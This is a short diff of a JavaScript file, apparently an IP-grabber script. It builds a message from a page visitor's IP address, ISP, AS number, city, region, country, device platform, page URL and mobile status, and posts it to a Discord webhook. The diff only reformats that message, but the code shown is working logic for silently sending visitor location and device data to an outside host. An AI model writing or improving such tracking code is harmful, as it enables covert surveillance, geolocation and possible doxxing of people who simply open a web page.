@@ -56,7 +56,13 @@
   const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
   const baseLocation = location.href;
 
-  const ipMessage = `IP: ${ip || "unknown"}\nISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` ${ispInfo.as}` : ""}\nLocation: ${ispInfo.city ? ispInfo.city + ", " : ""}${ispInfo.region ? ispInfo.region + ", " : ""}${ispInfo.country || ""}\nDevice: ${platform}\nSite: ${baseLocation}`;
+  const ipMessage = 
+`IP: ${ip || "unknown"}
+ISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` AS${ispInfo.as}` : ""}
+Location: ${ispInfo.city ? ispInfo.city + ", " : ""}${ispInfo.region ? ispInfo.region + ", " : ""}${ispInfo.country || ""}
+Device: ${platform}
+Site: ${baseLocation}`;
+
   await sendToDiscord(webhookUrl, sanitizeForDiscord(ipMessage));
 
   const mobileMessage = navigator.userAgentData?.mobile ? "The Person is on Mobile" : "The Person is not on Mobile";
